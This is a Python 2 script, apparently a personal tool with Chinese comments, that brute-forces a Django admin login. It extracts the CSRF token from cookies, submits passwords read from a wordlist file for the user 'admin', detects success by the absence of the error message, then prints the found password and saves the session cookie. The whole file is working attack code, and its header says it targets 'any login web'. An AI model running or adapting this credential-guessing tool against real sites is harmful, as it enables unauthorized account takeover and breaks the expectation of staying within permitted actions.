#!/usr/bin/python
#coding=utf-8
#filename:web_auth_cookie_django2.py
#target is do for any login web.
""" 对比web_auth_cookie_django.py:
    在认证时、提交之前，用make_post()自动修改需要提交的数据及格式，之前再传递到crack()。
需要增加：从文本文件中读取密码，并用一个文件来保存当前读取到的位置，
下一次可以判断有无记录位置的文件，作为进度保存。
Python3 urllib 实例
http://www.itwhy.org/软件工程/python/python3-urllib-实例.html """

import urllib
import urllib2
import cookielib
import time
import sys

class AuthCookie():
    def __init__(self, user_agent, cookie_file, url):
        self.client_headers = {'User-Agent':user_agent}
        self.url = url
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.req = urllib2.Request(self.url, self.client_headers)
        
    def read_url(self):
        try:
            response = self.opener.open(self.url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ") "
            return
        return response

    def get_cookie(self, response):
        """ get cookie from response, will find and post the csrftoken for login."""
        cookie_list = response.headers.get('Set-Cookie').split(';')
        # print cookie_list #DEBUG
        head_cookie = {}
        for tmp in cookie_list:
            list_tmp =  str(tmp).split('=')
            head_cookie[list_tmp[0]] = list_tmp[1]
        return head_cookie

    def make_post(self, username, pwd_f, csrf):
        for key1 in pwd_f:
            pwd_encode = urllib.urlencode({
                'username': username,
                'password': key1.strip(),
                'this_is_the_login_form': 1,
                'next': '/admin/',
                'csrfmiddlewaretoken': csrf,
                })
            yield pwd_encode

    def crack(self, pwd_encode):
        try:
            self.req = urllib2.Request(self.url, self.client_headers)
            response = self.opener.open(self.req, pwd_encode)
        except urllib2.HTTPError, e:
            print "at opener.open, raise ERROR (", e, ") "
            sys.exit(-1)
        response_resu = response.getcode()
        if response_resu == 200:
            response_html = response.read()
            #怎么样判断是通过验证，标志是***用户登陆失败***
            case = response_html.find('Please enter the correct')
            if case != -1:
                pass   # password was error
            else:
                print time.ctime(), " Find The Key: ", pwd_encode, "GOODLUCK"
                self.cookiejar.save()
                # print self.cookiejar #DEBUG
                sys.exit(0)

# url_t = "http://192.168.192.214:8000/admin/"
url_t = "http://127.0.0.1:8000/admin/"
file_t = "/tmp/cookie11.txt"
agent_t = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
pwd_t = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']

if __name__ == "__main__":
    s11 = AuthCookie(agent_t, file_t, url_t)
    response_get = s11.read_url()
    head_cookie =  s11.get_cookie(response_get)
    print head_cookie #DEBUG
    print s11.cookiejar #DEBUG
    pwd_f = open('/tmp/pwd.txt')
    count = 0
    for pwd in s11.make_post('admin', pwd_f, head_cookie['csrftoken']):
        count += 1
        # print s11.cookiejar #DEBUG
        s11.crack(pwd)
        if count > 24:
            break
